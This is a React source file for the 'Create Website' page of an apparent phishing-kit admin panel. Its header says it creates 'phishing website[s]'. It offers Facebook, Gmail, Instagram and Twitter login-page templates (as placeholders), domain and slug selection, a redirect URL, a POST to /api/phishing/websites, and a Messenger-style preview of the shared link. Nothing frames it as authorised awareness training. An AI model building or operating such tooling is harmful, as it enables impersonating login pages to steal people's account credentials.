import { useState, useEffect } from 'react';
import { Page } from "components/shared/Page";
import { Card, Button, Input, Textarea, Select, Modal, ImageUpload } from "components/ui";
import { useThemeContext } from "app/contexts/theme/context";
import { 
  PlusIcon,
  GlobeAltIcon,
  DocumentTextIcon,
  LinkIcon,
  PhotoIcon,
  LanguageIcon,
  ServerIcon,
  EyeIcon,
  ShareIcon
} from '@heroicons/react/24/outline';
import { toast } from 'sonner';

export default function CreateWebsite() {
  const { isDark } = useThemeContext();
  const [isLoading, setIsLoading] = useState(false);
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [selectedTemplate, setSelectedTemplate] = useState(null);
  const [domains, setDomains] = useState([]);
  const [isLoadingDomains, setIsLoadingDomains] = useState(true);

  const [formData, setFormData] = useState({
    title: '',
    description: '',
    slug: '',
    redirect_url: '',
    temp1: '',
    temp2: '',
    thumbnail: '',
    language: 'en',
    domain: ''
  });

  const templates = [
    {
      id: 'facebook',
      name: 'Facebook Login',
      description: 'Facebook login page template',
      thumbnail: '/templates/facebook.jpg',
      temp1: '<div>Facebook Landing Page</div>',
      temp2: '<div>Facebook Login Form</div>'
    },
    {
      id: 'gmail',
      name: 'Gmail Login',
      description: 'Gmail login page template',
      thumbnail: '/templates/gmail.jpg',
      temp1: '<div>Gmail Landing Page</div>',
      temp2: '<div>Gmail Login Form</div>'
    },
    {
      id: 'instagram',
      name: 'Instagram Login',
      description: 'Instagram login page template',
      thumbnail: '/templates/instagram.jpg',
      temp1: '<div>Instagram Landing Page</div>',
      temp2: '<div>Instagram Login Form</div>'
    },
    {
      id: 'twitter',
      name: 'Twitter Login',
      description: 'Twitter login page template',
      thumbnail: '/templates/twitter.jpg',
      temp1: '<div>Twitter Landing Page</div>',
      temp2: '<div>Twitter Login Form</div>'
    }
  ];

  const languages = [
    { value: 'en', label: 'English', flag: 'US', flagUrl: 'https://flagsapi.com/US/flat/64.png' },
    { value: 'vi', label: 'Tiếng Việt', flag: 'VN', flagUrl: 'https://flagsapi.com/VN/flat/64.png' },
    { value: 'es', label: 'Español', flag: 'ES', flagUrl: 'https://flagsapi.com/ES/flat/64.png' },
    { value: 'fr', label: 'Français', flag: 'FR', flagUrl: 'https://flagsapi.com/FR/flat/64.png' },
    { value: 'de', label: 'Deutsch', flag: 'DE', flagUrl: 'https://flagsapi.com/DE/flat/64.png' },
    { value: 'zh', label: '中文', flag: 'CN', flagUrl: 'https://flagsapi.com/CN/flat/64.png' },
    { value: 'ja', label: '日本語', flag: 'JP', flagUrl: 'https://flagsapi.com/JP/flat/64.png' },
    { value: 'ko', label: '한국어', flag: 'KR', flagUrl: 'https://flagsapi.com/KR/flat/64.png' }
  ];
  
  console.log('Languages array:', languages);

  // Load domains from API
  useEffect(() => {
    const loadDomains = async () => {
      try {
        setIsLoadingDomains(true);
        const token = localStorage.getItem('authToken');
        
        const response = await fetch('/api/domains', {
          headers: {
            'Authorization': `Bearer ${token}`,
            'Content-Type': 'application/json'
          }
        });
        
        if (response.ok) {
          const data = await response.json();
          console.log('Domains API response:', data);
          const domainOptions = (data.data || [])
            .filter(domain => domain.is_active) // Only show active domains
            .map(domain => ({
              value: domain.domain_name,
              label: domain.domain_name
            }));
          console.log('Processed domain options:', domainOptions);
          setDomains(domainOptions);
        } else {
          console.error('Failed to load domains:', response.status);
          toast.error('Failed to load domains');
          // Fallback to default domains
          setDomains([
            { value: 'example.com', label: 'example.com' },
            { value: 'mydomain.com', label: 'mydomain.com' },
            { value: 'custom.net', label: 'custom.net' }
          ]);
        }
      } catch (error) {
        console.error('Error loading domains:', error);
        toast.error('Failed to load domains');
        // Fallback to default domains
        setDomains([
          { value: 'example.com', label: 'example.com' },
          { value: 'mydomain.com', label: 'mydomain.com' },
          { value: 'custom.net', label: 'custom.net' }
        ]);
      } finally {
        setIsLoadingDomains(false);
      }
    };

    loadDomains();
  }, []);

  const handleInputChange = (field, value) => {
    setFormData(prev => ({
      ...prev,
      [field]: value
    }));

    // Auto-generate slug from title
    if (field === 'title') {
      const slug = value.toLowerCase()
        .replace(/[^a-z0-9\s-]/g, '')
        .replace(/\s+/g, '-')
        .replace(/-+/g, '-')
        .trim();
      setFormData(prev => ({
        ...prev,
        slug: slug
      }));
    }
  };

  const handleTemplateSelect = (template) => {
    setSelectedTemplate(template);
    setFormData(prev => ({
      ...prev,
      temp1: template.temp1,
      temp2: template.temp2,
      thumbnail: template.thumbnail
    }));
    setIsModalOpen(false);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    
    if (!formData.title || !formData.slug) {
      toast.error('Please fill in required fields');
      return;
    }

    try {
      setIsLoading(true);
      const token = localStorage.getItem('authToken');
      
      const response = await fetch('/api/phishing/websites', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${token}`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(formData)
      });

      if (response.ok) {
        await response.json();
        toast.success('Website created successfully!');
        
        // Reset form
        setFormData({
          title: '',
          description: '',
          slug: '',
          redirect_url: '',
          temp1: '',
          temp2: '',
          thumbnail: '',
          language: 'en',
          domain: ''
        });
        setSelectedTemplate(null);
      } else {
        const errorData = await response.json();
        toast.error(errorData.message || 'Failed to create website');
      }
    } catch (error) {
      console.error('Error creating website:', error);
      toast.error('Failed to create website');
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <Page title="Create Website">
      <div className="transition-content w-full px-(--margin-x) pt-5 lg:pt-6">
        <div className="min-w-0">
          {/* Header */}
          <div className="mb-8">
            <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4">
              <div className="flex items-center gap-3">
                <div className={`p-3 rounded-xl ${isDark ? 'bg-primary-500/20' : 'bg-primary-100'}`}>
                  <PlusIcon className={`h-6 w-6 ${isDark ? 'text-primary-400' : 'text-primary-600'}`} />
                </div>
                <div>
                  <h1 className="text-3xl font-bold text-gray-900 dark:text-white">
                    Create Website
                  </h1>
                  <p className="mt-2 text-gray-600 dark:text-gray-400">
                    Create a new phishing website with custom templates
                  </p>
                </div>
              </div>
            </div>
          </div>

          {/* Grid Layout */}
          <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
            {/* Column 1: Basic Information & Domain Selection */}
            <div>
              <Card className={`p-6 ${isDark ? 'bg-gray-800/50 border-gray-700' : 'bg-white border-gray-200'}`}>
                <form onSubmit={handleSubmit} className="space-y-6">
                  {/* Basic Information */}
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                    <div>
                      <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                        <GlobeAltIcon className="h-4 w-4 inline mr-1" />
                        Website Title *
                      </label>
                      <Input
                        value={formData.title}
                        onChange={(e) => handleInputChange('title', e.target.value)}
                        placeholder="Enter website title"
                        required
                      />
                    </div>

                    <div>
                      <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                        <LinkIcon className="h-4 w-4 inline mr-1" />
                        URL Slug *
                      </label>
                      <Input
                        value={formData.slug}
                        onChange={(e) => handleInputChange('slug', e.target.value)}
                        placeholder="website-slug"
                        required
                      />
                    </div>
                  </div>

                  <div>
                    <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                      <DocumentTextIcon className="h-4 w-4 inline mr-1" />
                      Description
                    </label>
                    <Textarea
                      value={formData.description}
                      onChange={(e) => handleInputChange('description', e.target.value)}
                      placeholder="Enter website description"
                      rows={3}
                    />
                  </div>

                  <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                    <div>
                      <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                        <ServerIcon className="h-4 w-4 inline mr-1" />
                        Domain *
                      </label>
                      <Select
                        value={formData.domain}
                        onChange={(e) => handleInputChange('domain', e.target.value)}
                        data={domains}
                        placeholder={isLoadingDomains ? "Loading domains..." : "Select domain"}
                        disabled={isLoadingDomains}
                        required
                      >
                        <option value="">{isLoadingDomains ? "Loading domains..." : "Select domain"}</option>
                        {domains.map((domain) => (
                          <option key={domain.value} value={domain.value}>
                            {domain.label}
                          </option>
                        ))}
                      </Select>
                      {domains.length === 0 && !isLoadingDomains && (
                        <p className="text-sm text-amber-600 dark:text-amber-400 mt-1">
                          No active domains available. Please contact admin to create domains.
                        </p>
                      )}
                    </div>

                    <div>
                      <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                        <LinkIcon className="h-4 w-4 inline mr-1" />
                        Redirect URL
                      </label>
                      <Input
                        value={formData.redirect_url}
                        onChange={(e) => handleInputChange('redirect_url', e.target.value)}
                        placeholder="https://example.com/redirect"
                        type="url"
                      />
                    </div>
                  </div>

                  <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                    <div>
                      <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                        <LanguageIcon className="h-4 w-4 inline mr-1" />
                        Language
                      </label>
                      <Select
                        value={formData.language}
                        onChange={(e) => handleInputChange('language', e.target.value)}
                        data={languages}
                      >
                        {languages.map((language) => (
                          <option key={language.value} value={language.value}>
                            {language.label}
                          </option>
                        ))}
                      </Select>
                    </div>

                    <div>
                      <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                        <PhotoIcon className="h-4 w-4 inline mr-1" />
                        Thumbnail
                      </label>
                      <ImageUpload
                        value={formData.thumbnail}
                        onChange={(value) => handleInputChange('thumbnail', value)}
                        placeholder="Upload website thumbnail"
                        accept="image/*"
                        maxSize={5 * 1024 * 1024}
                      />
                    </div>
                  </div>

                  {/* Template Selection */}
                  <div>
                    <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                      Template
                    </label>
                    <div className="flex items-center gap-4">
                      {selectedTemplate ? (
                        <div className="flex items-center gap-3 p-3 border rounded-lg">
                          <img 
                            src={selectedTemplate.thumbnail} 
                            alt={selectedTemplate.name}
                            className="w-12 h-12 rounded object-cover"
                            onError={(e) => e.target.style.display = 'none'}
                          />
                          <div>
                            <p className="font-medium">{selectedTemplate.name}</p>
                            <p className="text-sm text-gray-500">{selectedTemplate.description}</p>
                          </div>
                        </div>
                      ) : (
                        <p className="text-gray-500">No template selected</p>
                      )}
                      <Button
                        type="button"
                        variant="outlined"
                        color="primary"
                        onClick={() => setIsModalOpen(true)}
                      >
                        Select Template
                      </Button>
                    </div>
                  </div>

                  {/* Submit Button */}
                  <div className="flex justify-end">
                    <Button
                      type="submit"
                      variant="filled"
                      color="primary"
                      disabled={isLoading}
                    >
                      {isLoading ? 'Creating...' : 'Create Website'}
                    </Button>
                  </div>
                </form>
              </Card>
            </div>

            {/* Preview Section */}
            <div className="xl:col-span-1">
              <Card className={`p-6 ${isDark ? 'bg-gray-800/50 border-gray-700' : 'bg-white border-gray-200'}`}>
                <div className="flex items-center gap-2 mb-4">
                  <EyeIcon className="h-5 w-5 text-gray-500" />
                  <h3 className="text-lg font-semibold text-gray-900 dark:text-white">
                    Preview
                  </h3>
                </div>
                
                {/* Messenger Preview */}
                <div className="bg-gray-50 dark:bg-gray-700 rounded-lg p-4 mb-4">
                  <div className="flex items-start gap-3">
                    <div className="w-8 h-8 bg-blue-500 rounded-full flex items-center justify-center">
                      <span className="text-white text-xs font-bold">M</span>
                    </div>
                    <div className="flex-1">
                      <div className="bg-white dark:bg-gray-600 rounded-lg p-3 shadow-sm">
                        {formData.thumbnail && (
                          <img 
                            src={formData.thumbnail} 
                            alt="Website preview"
                            className="w-full h-32 object-cover rounded mb-2"
                            onError={(e) => e.target.style.display = 'none'}
                          />
                        )}
                        <div className="space-y-1">
                          <h4 className="font-medium text-gray-900 dark:text-white text-sm">
                            {formData.title || 'Website Title'}
                          </h4>
                          <p className="text-xs text-gray-600 dark:text-gray-300">
                            {formData.description || 'Website description will appear here...'}
                          </p>
                          <div className="flex items-center gap-2 mt-2">
                            <span className="text-xs text-blue-500">
                              {formData.domain ? `${formData.domain}/${formData.slug || 'slug'}` : 'domain.com/slug'}
                            </span>
                            <ShareIcon className="h-3 w-3 text-gray-400" />
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>

                {/* Website Info */}
                <div className="space-y-3">
                  <div className="flex items-center justify-between">
                    <span className="text-sm text-gray-600 dark:text-gray-400">Domain:</span>
                    <span className="text-sm font-medium text-gray-900 dark:text-white">
                      {formData.domain || 'Not selected'}
                    </span>
                  </div>
                  <div className="flex items-center justify-between">
                    <span className="text-sm text-gray-600 dark:text-gray-400">Language:</span>
                    <span className="text-sm font-medium text-gray-900 dark:text-white">
                      {languages.find(l => l.value === formData.language)?.label || 'English'}
                    </span>
                  </div>
                  <div className="flex items-center justify-between">
                    <span className="text-sm text-gray-600 dark:text-gray-400">Template:</span>
                    <span className="text-sm font-medium text-gray-900 dark:text-white">
                      {selectedTemplate?.name || 'Not selected'}
                    </span>
                  </div>
                </div>
              </Card>
            </div>
          </div>
        </div>
      </div>

      {/* Template Selection Modal */}
      <Modal open={isModalOpen} onClose={() => setIsModalOpen(false)}>
        <div className="p-6">
          <h3 className="text-lg font-semibold mb-4">Select Template</h3>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {templates.map((template) => (
              <div
                key={template.id}
                className={`p-4 border rounded-lg cursor-pointer hover:border-primary-500 transition-colors ${
                  isDark ? 'border-gray-700 hover:bg-gray-800' : 'border-gray-200 hover:bg-gray-50'
                }`}
                onClick={() => handleTemplateSelect(template)}
              >
                <img 
                  src={template.thumbnail} 
                  alt={template.name}
                  className="w-full h-32 rounded object-cover mb-3"
                  onError={(e) => e.target.style.display = 'none'}
                />
                <h4 className="font-medium">{template.name}</h4>
                <p className="text-sm text-gray-500">{template.description}</p>
              </div>
            ))}
          </div>
        </div>
      </Modal>
    </Page>
  );
}
